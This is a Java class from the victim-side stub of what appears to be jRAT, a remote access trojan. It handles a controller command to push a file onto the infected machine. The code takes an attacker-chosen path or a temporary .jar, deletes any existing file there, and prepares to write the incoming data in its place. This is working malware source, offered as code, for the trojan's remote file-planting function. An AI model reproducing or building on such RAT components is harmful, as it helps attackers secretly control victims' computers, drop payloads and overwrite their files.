package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.Temp;


public class Packet42ClientDownloadFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean temp = con.readBoolean();
		String f = con.readLine();
		long l = con.readLong();
		
		File file;
		
		if (temp) {
			file = File.createTempFile("download", ".jar");
			Temp.MAP.put(f, file);
		} else {
			file = new File(f);
		}

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		TransferData d = new TransferData();
		d.setLocalFile(file);
		d.setTotal(l);
		FileCache.put(f, d);
	}

}
